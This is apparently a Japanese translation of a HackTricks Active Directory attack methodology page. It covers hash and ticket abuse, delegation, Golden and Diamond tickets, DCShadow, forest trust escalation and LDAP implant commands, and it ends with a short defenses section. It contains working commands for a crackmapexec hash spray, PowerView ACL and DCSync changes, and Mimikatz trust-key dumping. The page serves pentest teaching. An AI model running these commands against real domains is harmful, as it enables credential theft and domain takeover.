この脆弱性により、認証済みのユーザーなら誰でも**ドメインコントローラーを侵害**できました。


{{#ref}}
printnightmare.md
{{#endref}}

## 特権のある認証情報／セッションを使ったActive Directoryでの権限昇格

**以下の手法は通常のドメインユーザー権限では不十分です。これらの攻撃を実行するには、特別な権限または認証情報が必要です。**

### Hashの抽出

[AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、relayを含む[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[ローカルでの権限昇格](../windows-local-privilege-escalation/index.html)を使って、**ローカル管理者アカウントを侵害**できているとよいでしょう。\
次に、メモリ上およびローカルにあるすべてのhashをダンプします。\
[**hashを取得するさまざまな方法については、このページを参照してください。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**ユーザーのhashを入手したら**、それを使ってユーザーに**なりすます**ことができます。\
そのhashを使ってNTLM認証を**実行する****ツール**を使う必要があります。**または**、新しい**sessionlogon**を作成し、その**hash**を**LSASS**に**注入**することもできます。そうすると、NTLM認証が行われる際に、その**hashが使用されます。**後者の方法はmimikatzが使用します。\
[**詳細については、このページを参照してください。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

この攻撃では、一般的なNTLMプロトコル上のPass The Hashの代わりに、**ユーザーのNTLM hashを使ってKerberosチケットを要求**します。そのため、NTLMプロトコルが無効化され、認証プロトコルとして**Kerberosのみが許可されている**ネットワークで特に**役立つ**可能性があります。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)**攻撃では、攻撃者はユーザーのパスワードやhash値ではなく、**ユーザーの認証チケットを窃取**します。窃取したチケットを使ってユーザーに**なりすまし**、ネットワーク内のリソースやサービスに不正アクセスします。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 認証情報の再利用

**ローカル管理者のhash**または**パスワード**を持っている場合は、それを使って他の**PC**に**ローカルログイン**できるか試しましょう。

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> これはかなり **noisy** であり、**LAPS** によって軽減できます。

### MSSQL Abuse & 信頼リンク

ユーザーが **MSSQL インスタンスへのアクセス権限**を持っている場合、MSSQL ホスト上で **コマンドを実行**したり（SA として実行されている場合）、NetNTLM **hash** を **窃取**したり、**relay attack** を実行したりできる可能性があります。\
ある MSSQL インスタンスが、別のインスタンスによってデータベースリンク経由で信頼されている場合、リンク先データベースに対する権限を持つユーザーは、その信頼関係を **利用してもう一方のインスタンスでクエリを実行**できる可能性があります。こうした信頼関係は連鎖することがあり、最終的に、ユーザーがコマンドを実行できる設定不備のデータベースに到達する場合があります。\
**データベース間のリンクは、フォレストの信頼関係を越えても機能します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 資産／デプロイプラットフォームの悪用

サードパーティ製のインベントリおよびデプロイメントツールは、多くの場合、認証情報やコード実行につながる強力な経路を提供します。以下を参照してください。

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性を持つ Computer オブジェクトが見つかり、そのコンピューターに対するドメイン権限があれば、そのコンピューターにログインするすべてのユーザーの TGT をメモリからダンプできます。\
そのため、**Domain Admin がそのコンピューターにログイン**すると、その TGT をダンプし、[Pass the Ticket](pass-the-ticket.md) を使ってなりすますことができます。\
Constrained Delegation を利用すれば、**Print Server を自動的に侵害**することさえ可能です（できれば、それが DC であることを期待しましょう）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

ユーザーまたはコンピューターに「Constrained Delegation」が許可されている場合、**コンピューター上の特定のサービスにアクセスするために、任意のユーザーになりすます**ことができます。\
その後、このユーザー／コンピューターの **hash を侵害**できれば、（domain admins を含む）**任意のユーザーになりすまして**特定のサービスにアクセスできます。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

リモートコンピューターの Active Directory オブジェクトに対する **WRITE** 権限があると、**昇格した権限**でコードを実行できるようになります。


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 権限／ACL の悪用

侵害したユーザーが、ドメイン内の一部のオブジェクトに対して**有用な権限**を持っている場合、横方向への **移動**や権限の **昇格**につなげられる可能性があります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service の悪用

ドメイン内で **Spool service がリッスンしている**ことが分かれば、これを**悪用**して**新しい認証情報を取得**し、**権限を昇格**できる可能性があります。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### サードパーティセッションの悪用

**他のユーザー**が**侵害済み**マシンに**アクセス**する場合、**メモリから認証情報を収集**したり、プロセスに beacon を **inject** してユーザーになりすましたりできる可能性があります。\
通常、ユーザーは RDP 経由でシステムにアクセスするため、サードパーティの RDP セッションに対する攻撃をいくつか実行する方法を以下に示します。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** は、ドメインに参加しているコンピューターの **local Administrator password** を管理する仕組みを提供します。パスワードは**ランダム化**され、コンピューターごとに異なる値に設定され、定期的に**変更**されます。これらのパスワードは Active Directory に保存され、ACL によって許可されたユーザーのみにアクセスが制限されます。これらのパスワードへのアクセスに十分な権限があれば、他のコンピューターへ pivot できる可能性があります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

侵害済みマシンから**証明書を収集**することで、環境内の権限を昇格できる可能性があります。


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**脆弱なテンプレート**が設定されている場合、それを悪用して権限を昇格できる可能性があります。


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 高い権限を持つアカウントでの Post-exploitation

### ドメイン認証情報のダンプ

**Domain Admin**、またはさらに強力な **Enterprise Admin** 権限を取得したら、ドメインの**データベース** _ntds.dit_ を **dump** できます。

[DCSync attack の詳細はこちら](dcsync.md)。

[NTDS.dit の窃取方法の詳細はこちら](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit` と `SYSTEM` hive を含む、読み取り可能なバックアップアーカイブは、展開する前の段階でも、ディレクトリ情報が露出したものとして扱う必要があります。古い password hash であっても、他のオブジェクト属性が安全になるわけではありません。`description` などのフィールドに認証情報や運用上のメモが含まれている可能性があります。まずアーカイブのメンバー名を確認し、展開したデータベースの内容を通常の列挙出力に含めないようにしてください。

### Persistence としての Privesc

前述の手法の一部は persistence に利用できます。\
たとえば、次のことができます。

- ユーザーを [**Kerberoast**](kerberoast.md) に対して脆弱な状態にする

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- ユーザーを [**ASREPRoast**](asreproast.md) に対して脆弱な状態にする

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- ユーザーに [**DCSync**](#dcsync) 権限を付与する

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack**は、**NTLM hash**（たとえば**PCアカウントのhash**）を使って、特定のサービス向けの**正規のTicket Granting Service (TGS) ticket**を作成します。この手法は、**サービスの権限にアクセスする**ために使用されます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**では、攻撃者がActive Directory (AD)環境の**krbtgtアカウントのNTLM hash**を入手します。このアカウントは、ADネットワーク内での認証に不可欠なすべての**Ticket Granting Ticket (TGT)**に署名するため、特別なアカウントです。

攻撃者はこのhashを入手すると、任意のアカウントの**TGT**を作成できます（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは、**一般的なgolden ticketの検出メカニズムを回避する**方法で偽造されたgolden ticketのようなものです。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **アカウントのCertificatesによるPersistence**

アカウントの**certificatesを所有する、または要求できること**は、ユーザーがパスワードを変更しても、そのユーザーのアカウントで**Persistenceを維持する**非常に有効な方法です。


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **ドメインのCertificatesによるPersistence**

**certificatesを使って、ドメイン内で高い権限を維持することも可能です。**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directoryの**AdminSDHolder**オブジェクトは、標準の**Access Control List (ACL)**を適用して、Domain AdminsやEnterprise Adminsなどの**特権グループ**を保護し、不正な変更を防ぎます。しかし、この機能は悪用される可能性があります。攻撃者がAdminSDHolderのACLを変更し、一般ユーザーにフルアクセス権を与えると、そのユーザーはすべての特権グループを広範に制御できるようになります。この保護を目的としたセキュリティ対策は、綿密に監視されていないと、かえって不当なアクセスを許す結果になり得ます。

[**AdminDSHolder Groupの詳細はこちら。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての**Domain Controller (DC)**には、**ローカル管理者**アカウントがあります。このようなマシンで管理者権限を得ると、**mimikatz**を使ってローカルAdministratorのhashを抽出できます。その後、レジストリを変更して**このパスワードを使用可能にする**ことで、ローカルAdministratorアカウントにリモートからアクセスできます。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

**ユーザー**に特定のドメインオブジェクトに対する**特殊な権限を付与**すると、そのユーザーは**将来的に権限昇格できる**ようになります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptor**は、ある**オブジェクト**が別の**オブジェクト**に対して持つ**権限を格納する**ために使われます。オブジェクトの**security descriptor**を**少し変更する**だけで、特権グループのメンバーにならずに、そのオブジェクトに対する非常に興味深い権限を得られる場合があります。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic ObjectsによるAnti-Forensics / Evasion

`dynamicObject`補助クラスを悪用し、`entryTTL`/`msDS-Entry-Time-To-Die`を使って、短命なprincipal/GPO/DNSレコードを作成します。これらはtombstoneを残さずに自動削除され、LDAPの証拠を消去する一方で、孤立したSID、壊れた`gPLink`参照、キャッシュされたDNS応答を残します（例: AdminSDHolder ACEの汚染や、悪意のある`gPCFileSysPath`/AD統合DNSリダイレクト）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

メモリ内の**LSASS**を改変して**共通パスワード**を設定し、すべてのドメインアカウントへのアクセスを可能にします。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider)とは何かについてはこちら。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の**SSP**を作成し、マシンへのアクセスに使われる**credentialsを平文で取得**できます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

ADに**新しいDomain Controller**を登録し、それを使って指定したオブジェクトの属性（SIDHistory、SPNなど）を**変更に関するログを一切残さずに**書き込みます。**DA**権限が必要で、**root domain**内にいる必要があります。\
誤ったデータを使用すると、非常に目立つログが出ることに注意してください。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

これまでは、**LAPSパスワードを読み取る十分な権限がある場合**に権限昇格する方法について説明しました。しかし、これらのパスワードは**Persistenceの維持**にも使えます。\
以下を確認してください:


{{#ref}}
laps.md
{{#endref}}

## Forestの権限昇格 - Domain Trusts

Microsoftは**Forest**をセキュリティ境界とみなしています。つまり、**単一のドメインを侵害すると、Forest全体も侵害される可能性があります**。<sup>[[1]](#references)</sup>

### 基本情報

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)は、ある**ドメイン**のユーザーが別の**ドメイン**のリソースにアクセスできるようにするセキュリティメカニズムです。これは、2つのドメインの認証システムを連携させ、認証の検証をシームレスに行えるようにします。ドメイン間でtrustを設定すると、trustの整合性を保つために重要な特定の**key**を交換し、それぞれの**Domain Controller (DC)**に保持します。

一般的なシナリオでは、ユーザーが**trustされたドメイン**内のサービスにアクセスする場合、まず自分のドメインのDCに**inter-realm TGT**と呼ばれる特別なticketを要求する必要があります。このTGTは、両ドメインが合意した共有**key**で暗号化されています。次に、ユーザーはこのTGTを**trustされたドメインのDC**に提示し、service ticket (**TGS**)を取得します。trustされたドメインのDCがinter-realm TGTを正常に検証すると、TGSを発行し、ユーザーにサービスへのアクセスを許可します。

**手順**:

1. **Domain 1**の**クライアントコンピューター**は、自身の**NTLM hash**を使って**Domain Controller (DC1)**に**Ticket Granting Ticket (TGT)**を要求し、処理を開始します。
2. クライアントの認証に成功すると、DC1は新しいTGTを発行します。
3. 次にクライアントは、**Domain 2**のリソースへのアクセスに必要な**inter-realm TGT**をDC1に要求します。
4. inter-realm TGTは、双方向のdomain trustの一部としてDC1とDC2が共有する**trust key**で暗号化されます。
5. クライアントはinter-realm TGTを**Domain 2のDomain Controller (DC2)**に渡します。
6. DC2は共有trust keyを使ってinter-realm TGTを検証し、有効であれば、クライアントがアクセスしようとしているDomain 2内のサーバー向けに**Ticket Granting Service (TGS)**を発行します。
7. 最後にクライアントは、このTGSをサーバーに提示します。TGSはサーバーアカウントのhashで暗号化されており、これによってDomain 2内のサービスにアクセスできます。

### Trustの種類

**trustは一方向にも双方向にも設定できる**点に注意してください。双方向の場合、両方のドメインが互いをtrustします。一方、**一方向**のtrust関係では、一方のドメインが**trustされる側**、もう一方が**trustする側**になります。後者の場合、**trustされる側から、trustする側のドメイン内にあるリソースにのみアクセスできます**。

Domain AがDomain Bをtrustしている場合、Aはtrustする側、Bはtrustされる側です。また、**Domain A**ではこれを**Outbound trust**といい、**Domain B**では**Inbound trust**といいます。

**Trust関係の種類**

- **Parent-Child Trusts**: 同じForest内でよく使われる構成で、子ドメインは親ドメインと自動的に双方向のtransitive trustを持ちます。つまり、親ドメインと子ドメインの間で認証要求をシームレスにやり取りできます。
- **Cross-link Trusts**: 「shortcut trust」とも呼ばれ、子ドメイン間で参照処理を高速化するために設定されます。複雑なForestでは、通常、認証の参照情報はForest rootまで移動してから対象ドメインに下ります。cross-linkを作成すると、この経路が短縮され、特に地理的に分散した環境で有効です。
- **External Trusts**: 相互に関連のない別々のドメイン間に設定され、transitiveではありません。[Microsoftのドキュメント](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)によると、external trustは、Forest trustで接続されていない、現在のForest外のドメイン内にあるリソースへのアクセスに役立ちます。external trustではSID filteringによってセキュリティが強化されます。
- **Tree-root Trusts**: Forest root domainと新たに追加されたtree rootの間に自動的に設定されます。一般的ではありませんが、新しいドメインツリーをForestに追加する際に重要です。これにより、固有のドメイン名を維持しながら、双方向のtransitivityを確保できます。詳しくは[Microsoftのガイド](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)を参照してください。
- **Forest Trusts**: 2つのForest root domain間の双方向transitive trustで、セキュリティ強化のためにSID filteringも適用されます。
- **MIT Trusts**: Windows以外の[RFC4120準拠](https://tools.ietf.org/html/rfc4120)Kerberos domainとの間に設定されます。MIT trustは比較的特殊で、Windowsエコシステム外のKerberosベースのシステムとの統合が必要な環境に適しています。

#### **Trust関係**におけるその他の違い

- trust関係は、**transitive**（AがBをtrustし、BがCをtrustする場合、AはCもtrustする）または**non-transitive**にできます。
- trust関係は、**双方向trust**（互いにtrustする）または**一方向trust**（一方のみが他方をtrustする）として設定できます。

### 攻撃経路

1. trust関係を**列挙**する
2. **security principal**（user/group/computer）が、ACEエントリや他方のドメインのグループへの所属などを通じて、**他方のドメイン**のリソースに**アクセスできる**か確認する。**ドメイン間の関係**を探す（おそらくそのためにtrustが作成されています）。
   1. この場合、kerberoastも別の選択肢になります。
3. ドメイン間を**pivot**できる**アカウント**を**侵害**する。

攻撃者は、主に次の3つの仕組みを通じて、別のドメインのリソースにアクセスできます。

- **Local Group Membership**: principalは、サーバー上の「Administrators」グループなど、マシンのローカルグループに追加されることがあります。これにより、そのマシンを大幅に制御できるようになります。
- **Foreign Domain Group Membership**: principalは、外部ドメイン内のグループのメンバーになることもあります。ただし、この方法の有効性はtrustの種類とグループのスコープによって異なります。
- **Access Control Lists (ACLs)**: principalは**ACL**内、特に**DACL**内の**ACE**エントリに指定され、特定のリソースへのアクセス権を与えられることがあります。ACL、DACL、ACEの仕組みについて詳しく知りたい場合は、ホワイトペーパー「[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)」が非常に参考になります。<sup>[[17]](#references)</sup>

### 権限を持つ外部ユーザー/グループを見つける

ドメイン内のforeign security principalを見つけるには、**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**を確認できます。これらは**外部ドメイン/Forest**のユーザーまたはグループです。

**Bloodhound**またはpowerviewを使って確認できます。

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### 子フォレストから親フォレストへの権限昇格

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

ドメイン信頼関係を列挙するその他の方法：

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> **信頼されたキーは2つ**あります。1つは _Child --> Parent_ 用、もう1つは _Parent_ --> _Child_ 用です。\
> 現在のドメインで使用されているキーは、次の方法で確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injectionを悪用し、信頼関係を利用して子/親ドメインからEnterprise adminに権限昇格します。


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 書き込み可能なConfiguration NCを悪用する

Active Directory (AD) 環境のフォレスト全体にわたる構成データの中央リポジトリとして機能するConfiguration Naming Context (NC) が、どのように悪用されるかを理解することは重要です。このデータはフォレスト内のすべてのDomain Controller (DC) に複製され、書き込み可能なDCにはConfiguration NCの書き込み可能なコピーが保持されます。これを悪用するには、**DC上のSYSTEM権限**が必要です。可能であれば子DCが望ましいです。

**GPOをルートDCサイトにリンクする**

Configuration NCのSitesコンテナには、ADフォレスト内のドメイン参加コンピューターすべてのサイト情報が含まれています。任意のDC上でSYSTEM権限を持って操作することで、攻撃者はGPOをルートDCサイトにリンクできます。この操作により、これらのサイトに適用されるポリシーを操作し、ルートドメインを侵害できる可能性があります。

詳しくは、[SID Filteringのバイパス](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)に関する調査を参照してください。<sup>[[12]](#references)</sup>

**フォレスト内の任意のgMSAを侵害する**

攻撃経路の1つは、ドメイン内の特権を持つgMSAを標的にすることです。gMSAのパスワード計算に不可欠なKDS Root keyは、Configuration NCに保存されています。任意のDC上でSYSTEM権限があれば、KDS Root keyにアクセスし、フォレスト内の任意のgMSAのパスワードを計算できます。

詳細な分析と手順については、以下を参照してください。


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

関連する委任型MSA攻撃 (BadSuccessor – migration attributesの悪用):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

その他の外部調査: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema変更攻撃**

この手法では、新しい特権ADオブジェクトが作成されるまで待つ必要があるため、忍耐が必要です。SYSTEM権限があれば、攻撃者はAD Schemaを変更し、任意のユーザーにすべてのクラスへの完全な制御権を付与できます。これにより、新しく作成されたADオブジェクトへの不正アクセスや制御につながる可能性があります。

詳しくは、[Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)を参照してください。<sup>[[14]](#references)</sup>

**ADCS ESC5によるDAからEAへの権限昇格**

ADCS ESC5の脆弱性は、Public Key Infrastructure (PKI) オブジェクトの制御権を標的にし、フォレスト内の任意のユーザーとして認証できる証明書テンプレートを作成します。PKIオブジェクトはConfiguration NCにあるため、書き込み可能な子DCを侵害すると、ESC5攻撃を実行できます。

詳しくは、[ESC5によるDAからEAへの権限昇格](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)を参照してください。<sup>[[15]](#references)</sup> ADCSが存在しない環境では、攻撃者は必要なコンポーネントをセットアップできます。詳細は[子ドメインのDomain AdminsからEnterprise Adminsへの権限昇格](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)を参照してください。<sup>[[16]](#references)</sup>

### 外部フォレストドメイン - 一方向 (インバウンド) または双方向

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

このシナリオでは、外部ドメインから**信頼されている**あなたのドメインに対し、外部ドメイン上で**不明な権限**が与えられています。自分のドメインのどの principal が外部ドメインに対してどのアクセス権を持つかを特定し、それを悪用してみる必要があります:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向（Outbound）

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

このシナリオでは、**あなたのドメイン**が、**別のドメイン**のプリンシパルに対して、いくつかの**特権**を**信頼**しています。

ただし、**信頼元ドメイン**から**信頼されるドメイン**は、**予測可能な名前**を持ち、**信頼パスワード**をパスワードとして使用するユーザーを**作成**します。つまり、**信頼元ドメインのユーザーにアクセス**して**信頼されるドメインに侵入**し、列挙してさらに特権昇格を試みることが可能です。


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

信頼されるドメインを侵害するもう1つの方法は、ドメインの信頼関係とは**逆方向**に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（これはあまり一般的ではありません）。

信頼されるドメインを侵害するもう1つの方法は、**信頼されるドメインのユーザーがアクセスして** **RDP** でログインできるマシン上で待機することです。その後、攻撃者はRDPセッションのプロセスにコードを注入し、そこから**被害者の元のドメインにアクセス**できます。\
さらに、**被害者がハードドライブをマウントしていた**場合、攻撃者は**RDPセッション**のプロセスから、ハードドライブの**スタートアップフォルダー**に**バックドア**を保存できます。この手法は **RDPInception** と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### ドメイン信頼関係の悪用への対策

### **SID Filtering:**

- フォレスト間の信頼関係でSID history属性を悪用する攻撃のリスクは、SID Filteringによって軽減されます。SID Filteringは、すべてのフォレスト間信頼関係でデフォルトで有効になっています。これは、Microsoftの見解に従い、フォレストをセキュリティ境界とみなし、フォレスト内の信頼関係は安全であるという前提に基づいています。
- ただし、注意点があります。SID filteringはアプリケーションやユーザーアクセスに支障をきたす可能性があるため、無効化されることがあります。

### **Selective Authentication:**

- フォレスト間の信頼関係では、Selective Authenticationを使用すると、2つのフォレストのユーザーが自動的に認証されなくなります。代わりに、信頼元ドメインまたはフォレスト内のドメインやサーバーにユーザーがアクセスするには、明示的な権限が必要です。
- これらの対策は、書き込み可能なConfiguration Naming Context (NC) の悪用や、信頼アカウントへの攻撃を防止しない点に注意してください。

[**ired.teamのドメイン信頼関係に関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## ホスト上のインプラントからのLDAPベースのADの悪用

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は、bloodyAD形式のLDAPプリミティブを、ホスト上のインプラント（例: Adaptix C2）内で完全に実行されるx64 Beacon Object Filesとして再実装しています。オペレーターは `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` を実行してパックをコンパイルし、`ldap.axs` を読み込んだ後、beaconから `ldap <subcommand>` を呼び出します。すべての通信は、現在のログオンセキュリティコンテキストを使い、signing/sealingを有効にしたLDAP (389)、または証明書を自動的に信頼するLDAPS (636) 経由で行われるため、socksプロキシやディスク上のアーティファクトは不要です。<sup>[[4]](#references)</sup>

### インプラント側のLDAP列挙

- `get-users`、`get-computers`、`get-groups`、`get-usergroups`、`get-groupmembers` は、短い名前やOUパスを完全なDNに解決し、対応するオブジェクトをダンプします。
- `get-object`、`get-attribute`、`get-domaininfo` は、任意の属性（セキュリティ記述子を含む）と、`rootDSE` からフォレスト/ドメインのメタデータを取得します。
- `get-uac`、`get-spn`、`get-delegation`、`get-rbcd` は、roasting候補、委任設定、およびLDAPから既存の[Resource-based Constrained Delegation](resource-based-constrained-delegation.md)記述子を直接表示します。
- `get-acl` と `get-writable --detailed` はDACLを解析し、信頼されたプリンシパル、権限（GenericAll/WriteDACL/WriteOwner/属性への書き込み）、継承を一覧表示して、ACLを使った特権昇格の対象をすぐに特定できます。

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### escalation と persistence のための LDAP write primitive

- オブジェクト作成 BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）を使うと、OU の権限がある場所に新しい principal や machine account を作成できる。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は、write-property 権限が見つかった対象を直接乗っ取る。
- ACL に特化したコマンド（`add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync`）を使うと、任意の AD オブジェクトに対する WriteDACL/WriteOwner を、パスワードリセット、グループメンバーシップの制御、DCSync レプリケーション権限へと変換できる。PowerShell/ADSI の痕跡は残らない。`remove-*` 系のコマンドで、追加した ACE をクリーンアップできる。

### Delegation、roasting、Kerberos の悪用

- `add-spn`/`set-spn` を使うと、侵害したユーザーをすぐに Kerberoast の対象にできる。`add-asreproastable`（UAC の切り替え）は、パスワードに触れずに AS-REP roasting の対象として設定する。
- Delegation macro（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は、beacon から `msDS-AllowedToDelegateTo`、UAC flag、`msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換え、constrained/unconstrained/RBCD の攻撃経路を可能にする。リモート PowerShell や RSAT は不要。

### sidHistory の注入、OU の移動、攻撃対象領域の形成

- `add-sidhistory` は、制御下の principal の SID history に特権 SID を注入する（[SID-History Injection](sid-history-injection.md) を参照）。LDAP/LDAPS 経由のみで、検知されにくいアクセス権の継承を実現できる。
- `move-object` は、コンピューターやユーザーの DN/OU を変更する。これにより、攻撃者は資産を委任された権限の対象に移動してから、`set-password`、`add-groupmember`、`add-spn` を使用できる。移動権限と継承の確認については、[OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) を参照。
- 対象を限定した削除コマンド（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` など）を使うと、認証情報や persistence を取得した後、すばやく変更を元に戻して telemetry を最小限に抑えられる。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御策

[**認証情報の保護方法について詳しくはこちら。**](../stealing-credentials/credentials-protections.md)

### **認証情報を保護する防御策**

- **Domain Admins の制限**: Domain Admins のログイン先は Domain Controller のみに制限し、他のホストで使用しないことを推奨する。
- **サービスアカウントの権限**: セキュリティを維持するため、サービスを Domain Admin（DA）権限で実行しない。
- **特権の一時的な制限**: DA 権限が必要なタスクでは、その使用期間を制限する。たとえば、次のように設定できる: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay の緩和策**: Event ID 2889/3074/3075 を監査し、その後 DC/クライアントで LDAP signing と LDAPS channel binding を強制して、LDAP MITM/relay の試みを阻止する。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket の活動をプロトコルレベルで fingerprinting する

一般的な AD tradecraft を検知する場合、名前を変更できるバイナリ、サービス名、一時的な batch file、出力先など、**オペレーターが制御できる痕跡だけに依存しない**こと。正規の Windows クライアントが[Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC、WMI のトラフィックをどのように生成するかをベースライン化し、オペレーターが `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py`、`ntlmrelayx.py` を編集した後も残る**実装上の癖**を探す。<sup>[[8]](#references)</sup>

